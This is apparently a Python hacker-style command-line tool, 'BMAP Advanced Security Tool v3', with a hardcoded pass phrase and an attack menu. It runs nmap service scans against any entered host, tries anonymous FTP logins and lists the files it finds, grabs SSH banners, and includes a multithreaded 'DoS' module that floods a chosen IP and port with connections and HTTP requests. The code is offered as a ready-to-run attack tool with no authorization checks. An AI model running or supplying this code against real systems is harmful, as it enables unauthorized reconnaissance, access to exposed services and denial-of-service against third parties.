#!/usr/bin/env python3
import sys
import subprocess
import os
import time
import socket
import threading
from ftplib import FTP

RED = '\033[91m'
GREEN = '\033[92m'
CYAN = '\033[96m'
YELLOW = '\033[93m'
RESET = '\033[0m'

def banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(CYAN + """
  ____  __  __   _    ____ 
 | __ )|  \\/  | / \\  |  _ \\
 |  _ \\| |\\/| |/ _ \\ | |_) |
 | |_) | |  | / ___ \\|  __/ 
 |____/|_|  |_/_/   \\_|_|    
""" + "[!] BMAP Advanced Security Tool v3" + RESET)

def check_signature():
    banner()
    print(YELLOW + "[?] Enter Pass / Signature (Press Enter to skip):" + RESET)
    code = input(CYAN + "> " + RESET).strip()
    if code == "madalina":
        os.system('clear' if os.name == 'posix' else 'cls')
        print(GREEN + """
   ____                _         ____  __   __  __  __       _     _ _     
  / ___|_ __ ___   ___| |_ ___  | __ ) \\ \\ / / |  \\/  | __ _| |__ | (_)    
 | |   | '__/ _ \ / _ \ __/ _ \ |  _ \\  \\ V /  | |\\/| |/ _` | '_ \\| | |    
 | |___| | | (_) |  __/ ||  __/ | |_) |  | |   | |  | | (_| | | | | | |    
  \\____|_|  \\___/ \\___|\\__\\___| |____/   |_|   |_|  |_|\\__,_|_| |_|_|_|    
                                                                           
                     [*] CREATED BY MAHDI [*]
        """ + RESET)
        print(YELLOW + "[+] Welcome back, Mahdi! Loading BMAP v3..." + RESET)
        time.sleep(2)

def ip_scan_menu():
    print(YELLOW + "\n[IP Resolve Module]" + RESET)
    target = input(CYAN + "[?] Enter Target Domain or IP: " + RESET).strip()
    if not target:
        return
    print(GREEN + f"\n[*] Resolving IP for {target}..." + RESET)
    try:
        ip = socket.gethostbyname(target)
        print(GREEN + f"\n[+] Target IP Address: {ip}" + RESET)
    except Exception as e:
        print(RED + f"\n[-] Failed to resolve IP: {e}" + RESET)
    input(CYAN + "\n[Press Enter to return]" + RESET)

def link_scan_menu():
    import requests
    print(YELLOW + "\n[Link Scan Module]" + RESET)
    url = input(CYAN + "[?] Enter Target URL: " + RESET).strip()
    if not url.startswith("http"):
        url = "http://" + url
    print(GREEN + f"\n[*] Scanning headers for {url}..." + RESET)
    try:
        response = requests.get(url, timeout=5)
        print(GREEN + f"\n[+] Status Code: {response.status_code}" + RESET)
        print(GREEN + f"\n[+] Server Type: {response.headers.get('Server', 'Unknown')}" + RESET)
    except Exception as e:
        print(RED + f"\n[-] Connection failed: {e}" + RESET)
    input(CYAN + "\n[Press Enter to return]" + RESET)

def check_anonymous_ftp(ip):
    print(YELLOW + f"\n[*] Testing Anonymous FTP login on {ip}:21..." + RESET)
    try:
        ftp = FTP()
        ftp.connect(ip, 21, timeout=5)
        ftp.login('anonymous', 'anonymous@')
        print(GREEN + "[+] SUCCESS: Anonymous FTP login allowed!" + RESET)
        try:
            files = ftp.nlst()
            print(f"    Available files/directories: {files}")
        except:
            print("    Connected, but couldn't list directory.")
        ftp.quit()
    except Exception as e:
        print(RED + "[-] FTP Anonymous login failed or port closed." + RESET)

def check_ssh_banner(ip):
    print(YELLOW + f"\n[*] Checking SSH service banner on {ip}:22..." + RESET)
    try:
        s = socket.socket()
        s.settimeout(4)
        s.connect((ip, 22))
        banner_data = s.recv(1024).decode().strip()
        print(GREEN + f"[+] SSH Open! Banner: {banner_data}" + RESET)
        s.close()
    except Exception:
        print(RED + "[-] SSH port closed or not responding." + RESET)

def ip_attack_module():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(RED + "[!] --- Target Recon & Attack Analysis (v3) ---\n" + RESET)
    target = input(CYAN + "[?] Enter Target IP or Domain (English): " + RESET).strip()
    
    if not target:
        print(YELLOW + "[!] Target cannot be empty!" + RESET)
        time.sleep(1.5)
        return

    print(GREEN + f"\n[+] Starting comprehensive Nmap scan on {target}..." + RESET)
    print(YELLOW + "[*] Please wait, scanning standard ports (21, 22, 80, 443)...\n" + RESET)
    
    try:
        nmap_command = ['nmap', '-sV', '-p', '21,22,80,443', target]
        result = subprocess.run(nmap_command, capture_output=True, text=True, timeout=60)
        scan_output = result.stdout
        print(scan_output)
    except FileNotFoundError:
        print(RED + "[!] Error: 'nmap' is not installed! Installing..." + RESET)
        subprocess.run(['pkg', 'install', '-y', 'nmap'])
        result = subprocess.run(nmap_command, capture_output=True, text=True, timeout=60)
        print(result.stdout)
    except Exception as e:
        print(RED + f"[!] Error running nmap: {e}" + RESET)
        return

    print(CYAN + "\n================ [ Service Analysis ] ================" + RESET)
    if "21/tcp open" in scan_output:
        check_anonymous_ftp(target)
    else:
        print(RED + "[-] Port 21 (FTP) is closed or filtered." + RESET)

    if "22/tcp open" in scan_output:
        check_ssh_banner(target)
    else:
        print(RED + "[-] Port 22 (SSH) is closed or filtered." + RESET)

    if "80/tcp open" in scan_output:
        print(GREEN + "\n[+] Port 80 (HTTP) is OPEN!" + RESET)
        print(f"    URL Link: http://{target}")

    if "443/tcp open" in scan_output:
        print(GREEN + "\n[+] Port 443 (HTTPS) is OPEN!" + RESET)
        print(f"    URL Link: https://{target}")

    if "80/tcp" not in scan_output and "443/tcp" not in scan_output:
        print(RED + "[-] Web ports (80/443) are closed." + RESET)

    print(CYAN + "\n======================================================" + RESET)
    input(CYAN + "\n[Press Enter to return to attack menu]" + RESET)

def dos_attack_module():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(RED + "[!] --- DoS / Stress Test Module (v3) ---\n" + RESET)
    target_ip = input(CYAN + "[?] Enter Target IP or Domain: " + RESET).strip()
    try:
        port = int(input(CYAN + "[?] Enter Target Port (e.g. 80, 443): " + RESET).strip())
        threads_count = int(input(CYAN + "[?] Enter Number of Threads (e.g. 50-200): " + RESET).strip())
    except ValueError:
        print(YELLOW + "[!] Invalid input! Numbers required for port and threads." + RESET)
        time.sleep(1.5)
        return

    if not target_ip:
        print(YELLOW + "[!] Target cannot be empty!" + RESET)
        time.sleep(1.5)
        return

    print(GREEN + f"\n[+] Launching DoS simulation against {target_ip}:{port} with {threads_count} threads..." + RESET)
    print(YELLOW + "[*] Press Ctrl+C to stop the attack.\n" + RESET)
    
    stop_flag = False

    def flood():
        nonlocal stop_flag
        while not stop_flag:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((target_ip, port))
                s.sendto(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n", (target_ip, port))
                s.close()
                print(GREEN + "[+] Packet sent successfully!" + RESET)
            except Exception:
                print(RED + "[-] Connection failed / Target down or filtered." + RESET)
                break

    threads = []
    try:
        for _ in range(min(threads_count, 150)):
            t = threading.Thread(target=flood)
            t.daemon = True
            threads.append(t)
            t.start()
        
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        stop_flag = True
        print(YELLOW + "\n[!] DoS attack stopped by user." + RESET)
    
    input(CYAN + "\n[Press Enter to return]" + RESET)

def attack_main_menu():
    while True:
        banner()
        print(GREEN + "[1] [+] IP Attack & Recon (Nmap, FTP, SSH, Web)" + RESET)
        print(GREEN + "[2] [+] DoS / Stress Test Module" + RESET)
        print(RED + "[3] [<-] Back to Main Menu" + RESET)
        choice = input(YELLOW + "\n[?] Choose Option (1-3): " + RESET).strip()
        if choice == '1':
            ip_attack_module()
        elif choice == '2':
            dos_attack_module()
        elif choice == '3':
            break

def main():
    check_signature()
    while True:
        banner()
        print(GREEN + "[1] [+] IP Resolve" + RESET)
        print(GREEN + "[2] [+] Link Scan" + RESET)
        print(GREEN + "[3] [+] Attack & Recon Menu" + RESET)
        print(RED + "[4] [<-] Exit" + RESET)
        choice = input(YELLOW + "\n[?] Choose option (1-4): " + RESET).strip()
        if choice == '1':
            ip_scan_menu()
        elif choice == '2':
            link_scan_menu()
        elif choice == '3':
            attack_main_menu()
        elif choice == '4':
            print(RED + "\n[*] Exiting BMAP v3. Goodbye!" + RESET)
            sys.exit(0)

if __name__ == '__main__':
    main()
